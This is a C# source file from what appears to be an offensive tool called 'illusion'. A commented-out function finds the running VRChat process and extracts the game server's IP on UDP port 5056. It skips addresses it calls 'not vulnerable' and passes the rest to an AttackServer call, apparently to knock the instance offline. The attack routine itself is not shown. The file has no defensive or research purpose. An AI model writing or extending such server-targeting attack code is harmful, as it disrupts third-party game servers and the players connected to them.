using illusion_dc.manual;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace illusion_dc.utilities
{
    internal class Main
    {
        private static void OpenManual()
        {
            Manual frm2 = new Manual();
            frm2.ShowDialog();
        }

        // only works on my machine for some reason, something w eac
        //public static void vrchat()
        //{

        //    Process[] processes = Process.GetProcessesByName("vrchat");
        //    if (processes.Length == 0)
        //    {
        //        MessageBox.Show("Please make sure that VRChat is open", "illusion");
        //        return;
        //    }
        //    int pid = processes[0].Id;
        //    string[] results = Networking.GetIP(pid);
        //    if (results != null && results.Length > 0)
        //    {
        //        string resultString = string.Join(Environment.NewLine, results);

        //        string[] lines = resultString.Split(new string[] { Environment.NewLine }, StringSplitOptions.None);

        //        bool foundMatch = false;
        //        foreach (string line in lines)
        //        {
        //            if (line.Contains("UDP") && line.Contains("5056"))
        //            {
        //                if (line.Split(':')[2].StartsWith("216"))
        //                {
        //                    MessageBox.Show("This instance is not vulnurable", "illusion");
        //                    return;
        //                }
        //                API.Request.AttackServer(line.Split(':')[2], 5056, "vrchat");
        //                foundMatch = true;
        //                return;
        //            }
        //        }

        //        if (!foundMatch)
        //        {
        //            DialogResult result = MessageBox.Show("You may not be fully loaded into a instance or we had trouble fetching network information, Would you like to manually try?", "illusion", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
        //            if (result == DialogResult.Yes)
        //            {
        //                MainForm.proccessname = "vrchat";
        //                OpenManual();
        //            }

        //        }
        //    }
        //    else
        //    {
        //        MessageBox.Show("No matching processes networking found", "illusion");
        //    }
        //}










    }
    
}
